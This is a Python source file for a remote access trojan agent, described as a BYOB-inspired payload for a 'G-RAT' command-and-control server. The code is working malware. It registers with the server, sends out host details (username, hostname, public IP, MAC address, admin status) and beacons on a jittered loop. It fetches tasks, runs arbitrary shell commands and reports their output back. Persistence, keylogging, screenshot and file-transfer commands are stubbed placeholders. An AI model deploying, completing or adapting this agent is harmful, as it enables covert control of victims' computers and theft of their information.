#!/usr/bin/env python3
# BYOB-inspired payload for G-RAT C2
# Simplified version for demonstration purposes

import os
import sys
import time
import socket
import platform
import uuid
import subprocess
import base64
import json
import random
import threading
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Try to import requests, install if not available
try:
    import requests
    logging.info("Requests module found")
except ImportError:
    logging.info("Installing requests module...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "--quiet"])
        import requests
        logging.info("Requests module installed successfully")
    except Exception as e:
        logging.error(f"Failed to install requests: {e}")
        sys.exit(1)

# Configuration
C2_SERVER = "http://localhost:8080"  # Change to your server address
BEACON_INTERVAL = 30  # Seconds between beacons
JITTER = 10  # Random delay added to beacon (percentage of interval)
AGENT_ID = str(uuid.uuid4())
SESSION_KEY = base64.b64encode(os.urandom(32)).decode()  # Session encryption key (not used yet)
DEBUG = True  # Set to False for production

class Agent:
    def __init__(self):
        self.server = C2_SERVER
        self.id = AGENT_ID
        self.interval = BEACON_INTERVAL
        self.jitter = JITTER
        self.online = False
        self.info = self._collect_system_info()
        self.commands = {
            'shell': self._execute_shell,
            'screenshot': self._take_screenshot,
            'download': self._download_file,
            'upload': self._upload_file,
            'persist': self._setup_persistence,
            'keylogger': self._start_keylogger,
            'terminate': self._terminate
        }
        self.running = False
        self.keylogger_active = False
        self.keylog_data = ""
        
        logging.info(f"Agent initialized with ID: {self.id}")
        
    def _collect_system_info(self):
        """Collect system information"""
        try:
            info = {
                'platform': platform.platform(),
                'system': platform.system(),
                'release': platform.release(),
                'version': platform.version(),
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'hostname': socket.gethostname(),
                'username': os.getlogin() if hasattr(os, 'getlogin') else self._get_username(),
                'ip': self._get_public_ip(),
                'mac': self._get_mac_address(),
                'admin': self._is_admin()
            }
            logging.info("System information collected")
            return info
        except Exception as e:
            logging.error(f"Error collecting system info: {e}")
            return {
                'platform': 'Unknown',
                'system': platform.system(),
                'hostname': 'Unknown',
                'username': 'Unknown',
                'ip': 'Unknown'
            }
    
    def _get_username(self):
        """Get username when os.getlogin() isn't available"""
        try:
            if platform.system() == 'Windows':
                return os.environ.get('USERNAME', 'Unknown')
            else:
                return os.environ.get('USER', 'Unknown')
        except:
            return 'Unknown'
    
    def _get_public_ip(self):
        """Get the public IP address"""
        try:
            response = requests.get("https://api.ipify.org", timeout=5)
            return response.text.strip()
        except:
            return "Unknown"
    
    def _get_mac_address(self):
        """Get the MAC address"""
        try:
            if platform.system() == 'Windows':
                output = subprocess.check_output('getmac').decode()
                mac = output.split('\n')[3].split()[0].replace('-', ':')
                return mac
            else:
                # For Unix systems
                output = subprocess.check_output("ifconfig || ip link", shell=True).decode()
                mac = ""
                for line in output.split('\n'):
                    if 'ether' in line or 'link/ether' in line:
                        mac = line.split()[1]
                        break
                return mac
        except:
            return "00:00:00:00:00:00"
    
    def _is_admin(self):
        """Check if running with admin privileges"""
        try:
            if platform.system() == 'Windows':
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False
    
    def register(self):
        """Register with the C2 server"""
        try:
            data = {
                'id': self.id,
                'ip': self.info['ip'],
                'system_info': {
                    'hostname': self.info['hostname'],
                    'os': self.info['system'],
                    'architecture': self.info['architecture'],
                    'username': self.info['username']
                }
            }
            
            response = requests.post(
                f"{self.server}/api/register",
                json=data,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            if response.status_code == 200:
                self.online = True
                logging.info(f"Successfully registered with C2 server: {self.server}")
                return True
            else:
                logging.error(f"Failed to register. Status: {response.status_code}")
                return False
        except Exception as e:
            logging.error(f"Registration error: {e}")
            return False
    
    def beacon(self):
        """Send beacon to C2 server"""
        try:
            data = {
                'agent_id': self.id
            }
            
            response = requests.post(
                f"{self.server}/api/beacon",
                json=data,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            if response.status_code == 200:
                logging.debug("Beacon sent successfully")
                return True
            else:
                logging.error(f"Beacon failed. Status: {response.status_code}")
                return False
        except Exception as e:
            logging.error(f"Beacon error: {e}")
            return False
    
    def get_task(self):
        """Get task from C2 server"""
        try:
            response = requests.get(
                f"{self.server}/api/task?agent_id={self.id}",
                timeout=10
            )
            
            if response.status_code == 200:
                task = response.json()
                if task and task.get('type') != 'noop':
                    logging.info(f"Received task: {task.get('type')} - {task.get('command')}")
                    return task
                return None
            else:
                logging.error(f"Failed to get task. Status: {response.status_code}")
                return None
        except Exception as e:
            logging.error(f"Get task error: {e}")
            return None
    
    def send_result(self, task_id, output, error="", exit_code=0):
        """Send task result back to C2 server"""
        try:
            data = {
                'agent_id': self.id,
                'task_id': task_id,
                'output': str(output),
                'error': str(error),
                'exit_code': exit_code,
                'start_time': time.time(),
                'finish_time': time.time()
            }
            
            response = requests.post(
                f"{self.server}/api/result",
                json=data,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            if response.status_code == 200:
                logging.info("Result sent successfully")
                return True
            else:
                logging.error(f"Failed to send result. Status: {response.status_code}")
                return False
        except Exception as e:
            logging.error(f"Send result error: {e}")
            return False
    
    def process_task(self, task):
        """Process a task from the C2 server"""
        task_type = task.get('type')
        task_id = task.get('id')
        command = task.get('command')
        
        if task_type in self.commands:
            try:
                output, error, exit_code = self.commands[task_type](command)
                self.send_result(task_id, output, error, exit_code)
            except Exception as e:
                self.send_result(task_id, "", str(e), 1)
        else:
            self.send_result(task_id, "", f"Unknown task type: {task_type}", 1)
    
    def _execute_shell(self, command):
        """Execute a shell command"""
        try:
            logging.info(f"Executing shell command: {command}")
            
            if platform.system() == 'Windows':
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            else:
                process = subprocess.Popen(['/bin/sh', '-c', command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
            stdout, stderr = process.communicate()
            return stdout.decode(), stderr.decode(), process.returncode
        except Exception as e:
            return "", str(e), 1
    
    def _take_screenshot(self, _):
        """Take a screenshot (placeholder)"""
        try:
            # This is just a placeholder - would use PIL or similar in a real implementation
            return "Screenshot functionality not implemented", "", 0
        except Exception as e:
            return "", str(e), 1
    
    def _download_file(self, remote_path):
        """Download a file from the agent to the C2 (placeholder)"""
        try:
            if os.path.exists(remote_path):
                return f"File exists: {remote_path} ({os.path.getsize(remote_path)} bytes)", "", 0
            else:
                return "", f"File not found: {remote_path}", 1
        except Exception as e:
            return "", str(e), 1
    
    def _upload_file(self, args):
        """Upload a file from C2 to the agent (placeholder)"""
        try:
            path, data = args.split(' ', 1)
            return f"Upload functionality not implemented. Would save to: {path}", "", 0
        except Exception as e:
            return "", str(e), 1
    
    def _setup_persistence(self, method=""):
        """Setup persistence on the system (placeholder)"""
        try:
            if platform.system() == 'Windows':
                return "Windows persistence would add registry key or scheduled task", "", 0
            else:
                return "Unix persistence would add crontab entry", "", 0
        except Exception as e:
            return "", str(e), 1
    
    def _start_keylogger(self, duration="60"):
        """Start a keylogger (placeholder)"""
        try:
            self.keylogger_active = True
            return "Keylogger functionality not implemented", "", 0
        except Exception as e:
            return "", str(e), 1
    
    def _terminate(self, _):
        """Terminate the agent"""
        self.running = False
        return "Agent terminating...", "", 0
    
    def run(self):
        """Main agent loop"""
        if not self.register():
            time.sleep(30)  # Wait before retry
            return
        
        self.running = True
        
        while self.running:
            try:
                # Add jitter to the beacon interval
                jitter_factor = 1 + random.uniform(-self.jitter/100, self.jitter/100)
                sleep_time = self.interval * jitter_factor
                
                self.beacon()
                
                # Get and process tasks
                task = self.get_task()
                if task:
                    self.process_task(task)
                
                # Sleep until next beacon
                time.sleep(sleep_time)
                
            except KeyboardInterrupt:
                logging.info("Agent terminated by keyboard interrupt")
                self.running = False
            except Exception as e:
                logging.error(f"Error in main loop: {e}")
                time.sleep(self.interval)  # Sleep before retry

if __name__ == "__main__":
    try:
        logging.info("Starting BYOB-style agent")
        agent = Agent()
        agent.run()
    except Exception as e:
        logging.error(f"Critical error: {e}")